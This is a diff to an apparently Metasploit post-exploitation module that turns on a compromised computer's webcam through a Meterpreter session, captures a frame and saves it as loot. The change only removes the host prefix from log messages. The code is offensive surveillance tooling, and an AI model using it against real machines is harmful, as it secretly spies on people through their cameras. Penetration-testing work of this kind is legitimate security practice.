@@ -74,24 +74,24 @@ class MetasploitModule < Msf::Post
     webcams = list_webcams
 
     if webcams.empty?
-      print_error("#{rhost} - No webcams found")
+      print_error("No webcams found")
       return
     end
 
     if !(webcams[datastore['INDEX'] - 1])
-      print_error("#{rhost} - No such index: #{datastore['INDEX']}")
+      print_error("No such index: #{datastore['INDEX']}")
       return
     end
 
     buf = nil
 
     begin
-      print_status("#{rhost} - Starting...")
+      print_status("Starting...")
       client.webcam.webcam_start(datastore['INDEX'])
 
       buf = client.webcam.webcam_get_frame(datastore['QUALITY'])
       if buf
-        print_status("#{rhost} - Got frame")
+        print_status("Got frame")
 
         p = store_loot(
           "#{rhost}.webcam.snapshot",
@@ -102,11 +102,11 @@ class MetasploitModule < Msf::Post
           "#{rhost} Webcam Snapshot"
         )
 
-        print_good("#{rhost} - Snapshot saved: #{p}")
+        print_good("Snapshot saved: #{p}")
       end
 
       client.webcam.webcam_stop
-      print_status("#{rhost} - Stopped")
+      print_status("Stopped")
     rescue Rex::Post::Meterpreter::RequestError => e
       print_error(e.message)
       return
